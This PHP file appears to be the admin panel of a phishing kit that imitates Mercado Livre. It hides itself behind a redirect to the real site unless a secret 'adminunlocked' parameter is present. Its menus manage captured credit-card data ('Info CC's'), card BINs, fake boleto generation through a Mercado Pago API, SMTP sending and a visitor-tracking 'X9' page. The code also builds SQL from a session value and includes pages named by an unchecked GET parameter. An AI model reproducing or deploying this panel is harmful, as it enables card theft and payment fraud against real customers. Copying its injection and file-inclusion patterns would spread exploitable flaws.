<?php

	include_once "settings/conn.php";
	include_once "settings/functions.php";
	session_start();
	date_default_timezone_set('America/Sao_Paulo');
	set_time_limit(0);
	error_reporting(0);
 
	if (!isset($_GET['adminunlocked'])) {
		echo "<script>window.location='https://www.mercadolivre.com.br'</script>";
	}

	if (!file_exists("settings/mail.php")) {
		include "settings/smtp.php";
		exit();
	}

	if (!isset($_SESSION['user'])) {
		include "login.php";
		exit();
	}else{
		$user = query("SELECT * FROM usuarios WHERE usuario = '".$_SESSION['user']."'");
		$row_user = assoc($user);
		$_SESSION['name'] = $row_user['nome'];
	}

?>

<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="">
	<meta name="author" content="">
	<link rel="icon" type="image/png" sizes="16x16" href="plugins/images/favicon.png">
	<title>Terminal DCK - Painel Administrativo</title>
	<!-- Bootstrap Core CSS -->
	<link href="css/bootstrap.css" rel="stylesheet">
	<!-- Menu CSS -->
	<link href="plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css" rel="stylesheet">
	<!-- toast CSS -->
	<link href="plugins/bower_components/toast-master/css/jquery.toast.css" rel="stylesheet">
	<!-- morris CSS -->
	<link href="plugins/bower_components/morrisjs/morris.css" rel="stylesheet">
	<!-- chartist CSS -->
	<link href="plugins/bower_components/chartist-js/dist/chartist.min.css" rel="stylesheet">
	<link href="plugins/bower_components/chartist-plugin-tooltip-master/dist/chartist-plugin-tooltip.css" rel="stylesheet">
	<!-- animation CSS -->
	<link href="css/animate.css" rel="stylesheet">
	<!-- Custom CSS -->
	<link href="css/style.css" rel="stylesheet">
	<!-- Custom personal CSS -->
	<link href="css/estilo.css" rel="stylesheet">
	<!-- color CSS -->
	<link href="css/colors/default.css" id="theme" rel="stylesheet">
	<!-- All Jquery -->
	<script src="js/jquery.js"></script>
	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
	<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
	<![endif]-->
</head>

<body class="fix-header">
	<!-- ============================================================== -->
	<!-- Preloader -->
	<!-- ============================================================== -->
	<div class="preloader">
		<svg class="circular" viewBox="25 25 50 50">
			<circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
		</svg>
	</div>
	<!-- ============================================================== -->
	<!-- Wrapper -->
	<!-- ============================================================== -->
	<div id="wrapper">
		<!-- ============================================================== -->
		<!-- Topbar header - style you can find in pages.scss -->
		<!-- ============================================================== -->
		<nav class="navbar navbar-default navbar-static-top m-b-0">
			<div class="navbar-header">
				<div class="top-left-part">
					<!-- Logo -->
					<a class="logo" href="index.php?adminunlocked">
						<!-- Logo icon image, you can use font-icon also --><b>
						<!--This is dark logo icon--><img src="plugins/images/admin-logo.png" alt="home" class="dark-logo" /><!--This is light logo icon--><img src="plugins/images/admin-logo-dark.png" alt="home" class="light-logo" />
					 </b>
						<!-- Logo text image you can use text also --><span class="hidden-xs">
						<!--This is dark logo text--><img src="plugins/images/admin-text.png" alt="home" class="dark-logo" /><!--This is light logo text--><img src="plugins/images/mercadolixo-logo.png" alt="home" class="light-logo" />
					 </span> </a>
				</div>
				<!-- /Logo -->
				<ul class="nav navbar-top-links navbar-right pull-right">
					<li>
						<form role="search" class="app-search hidden-sm hidden-xs m-r-10">
							<input type="text" placeholder="Search..." class="form-control"> <a href=""><i class="fa fa-search"></i></a> </form>
					</li>
					<li>
						<a class="profile-pic" href="#"> <img src="plugins/images/users/varun.jpg" alt="user-img" width="36" class="img-circle"><b class="hidden-xs"><?php echo $_SESSION['name']; ?></b> - <i><?php if($row_user['admin'] == 1){echo "Administrador";}else{echo "Teste";} ?></i></a>

						
					</li>
				</ul>
			</div>
			<!-- /.navbar-header -->
			<!-- /.navbar-top-links -->
			<!-- /.navbar-static-side -->
		</nav>
		<!-- End Top Navigation -->
		<!-- ============================================================== -->
		<!-- Left Sidebar - style you can find in sidebar.scss  -->
		<!-- ============================================================== -->
		<div class="navbar-default sidebar" role="navigation">
			<div class="sidebar-nav slimscrollsidebar">
				<div class="sidebar-head">
					<h3><span class="fa-fw open-close"><i class="ti-close ti-menu"></i></span> <span class="hide-menu">Navigation</span></h3>
				</div>
				<ul class="nav" id="side-menu">
					<li style="padding: 70px 0 0;">
						<a href="index.php?adminunlocked" class="waves-effect"><i class="fa fa-clock-o fa-fw" aria-hidden="true"></i>Dashboard</a>
					</li>
					<li>
						<a href="index.php?adminunlocked&page=infos" class="waves-effect"><i class="fa fa-credit-card-alt fa-fw" aria-hidden="true"></i>Info CC's</a>
					</li>
					<li>
						<a href="#" class="waves-effect" id="btn-1" data-toggle="collapse" data-target="#submenu" aria-expanded="false">
							<i class="fa fa-qrcode fa-fw" aria-hidden="true"></i>
							Boletos
							<i class="fa fa-angle-double-down rotate-icon" style="float: right;"></i>
						</a>
						<ul class="nav collapse" id="submenu" role="menu" aria-labelledby="btn-1">
							<?php $config = query("SELECT * FROM config"); $conf = assoc($config); if($conf['api'] == 0): ?>
							<?php elseif($conf['api'] == 1): ?>
							<li style="font-size:12px;"><a href="index.php?adminunlocked&page=api">API Mecado Pago</a></li>
							<?php endif; ?>
							<li style="font-size:12px;"><a href="index.php?adminunlocked&page=boletos">Boletos Gerados</a></li>
						</ul>
					</li>
					<li>
						<a href="index.php?adminunlocked&page=produtos" class="waves-effect"><i class="fa fa-clone fa-fw" aria-hidden="true"></i>Produtos</a>
					</li>
					<li>
						<a href="#" class="waves-effect" id="btn-1" data-toggle="collapse" data-target="#submenu1" aria-expanded="false">
							<i class="fa fa-cog fa-fw" aria-hidden="true"></i>
							Ferramentas
							<i class="fa fa-angle-double-down rotate-icon" style="float: right;"></i>
						</a>
						<ul class="nav collapse" id="submenu1" role="menu" aria-labelledby="btn-1">
							<?php if($row_user['admin'] == 1): ?>
							<li style="font-size:12px;"><a href="index.php?adminunlocked&page=gerenciador-de-usuarios">Gerenciador de usuários</a></li>
							<?php endif; ?>
							<li style="font-size:12px;"><a href="index.php?adminunlocked&page=config">Configurações da tela</a></li>
							<li style="font-size:12px;"><a href="index.php?adminunlocked&page=smtp">Configurações SMTP</a></li>
							<li style="font-size:12px;"><a href="index.php?adminunlocked&page=bins">Gerenciador de bins</a></li>
							<li style="font-size:12px;"><a href="index.php?adminunlocked&page=x9">Visualizar X9</a></li>
						</ul>
					</li>
					<li>
						<a href="logout.php" class="waves-effect"><i class="fa fa-sign-out fa-fw" aria-hidden="true"></i>Sair</a>
					</li>
					<li>
				</ul>
			</div>
			
		</div>
		<!-- ============================================================== -->
		<!-- End Left Sidebar -->
		<!-- ============================================================== -->
		<!-- ============================================================== -->
		<!-- Page Content -->
		<!-- ============================================================== -->
		<div id="page-wrapper">
			<div class="container-fluid">
					<?php

					if (isset($_GET['page'])) {
						if (file_exists("pages/".$_GET['page'].".php")) {
						   include "pages/".$_GET['page'].".php";
						}else{
							include "pages/404.php";
						}
					}else{
						include "pages/home.php";
					}

					?>
			</div>
			<!-- /.container-fluid -->
			<footer class="footer text-center"> <?php echo date('Y');?> &copy; - Criado por FAM0ZiN</footer>
		</div>
		<!-- ============================================================== -->
		<!-- End Page Content -->
		<!-- ============================================================== -->
	</div>
	<!-- ============================================================== -->
	<!-- End Wrapper -->
	<!-- ============================================================== -->
	<!-- ============================================================== -->
	<!-- Bootstrap Core JavaScript -->
	<script src="js/bootstrap.min.js"></script>
	<!-- Menu Plugin JavaScript -->
	<script src="plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js"></script>
	<!--slimscroll JavaScript -->
	<script src="js/jquery.slimscroll.js"></script>
	<!--Wave Effects -->
	<script src="js/waves.js"></script>
	<!--Counter js -->
	<script src="plugins/bower_components/waypoints/lib/jquery.waypoints.js"></script>
	<script src="plugins/bower_components/counterup/jquery.counterup.min.js"></script>
	<!-- chartist chart -->
	<script src="plugins/bower_components/chartist-js/dist/chartist.min.js"></script>
	<script src="plugins/bower_components/chartist-plugin-tooltip-master/dist/chartist-plugin-tooltip.min.js"></script>
	<!-- Sparkline chart JavaScript -->
	<script src="plugins/bower_components/jquery-sparkline/jquery.sparkline.min.js"></script>
	<!-- Custom Theme JavaScript -->
	<script src="js/custom.min.js"></script>
	<script src="js/dashboard1.js"></script>
	<script src="plugins/bower_components/toast-master/js/jquery.toast.js"></script>
</body>

</html>
